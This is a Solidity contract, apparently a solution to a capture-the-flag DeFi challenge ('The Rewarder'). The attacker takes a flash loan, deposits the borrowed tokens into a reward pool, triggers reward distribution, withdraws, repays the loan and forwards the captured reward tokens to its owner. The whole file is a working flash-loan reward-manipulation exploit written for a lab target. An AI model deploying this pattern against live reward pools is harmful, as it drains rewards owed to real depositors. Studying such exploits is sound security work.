// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";
/**
 * @title TheRewarderPoolAttacker
 * @author Caio Sá
*/

interface IRewarderPool {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function distributeRewards() external returns (uint256 rewards);
}

interface IFlashLoaner {
    function flashLoan(uint256 amount) external;
}

contract TheRewarderPoolAttacker {

    IRewarderPool private immutable rewarder;
    IFlashLoaner private immutable flashloaner;
    address immutable owner;
    IERC20 immutable token;
    IERC20 immutable rewarderToken;
    constructor(address _rewarder, address _flashloaner, address _token, address _rewarderToken) {
        rewarder = IRewarderPool(_rewarder);
        flashloaner = IFlashLoaner(_flashloaner);
        owner = msg.sender;
        token = IERC20(_token);
        rewarderToken = IERC20(_rewarderToken);
    }

    function attack(uint256 amount) external {
        require(msg.sender == owner, "!owner");
        flashloaner.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        console.log("inside cb");
        console.log("1 ", token.balanceOf(address(this)));// 1 ALOT
        token.approve(address(rewarder), amount);
        rewarder.deposit(amount);
        uint256 quantity = rewarder.distributeRewards();
        require(quantity > 0,"0");
        rewarder.withdraw(amount);
        token.transfer(address(flashloaner), amount);
        console.log("2 ", rewarderToken.balanceOf(address(this)));
        rewarderToken.transfer(owner, quantity);
        uint256 balance = rewarderToken.balanceOf(owner);
        require(balance > 0,"<0");
    }
}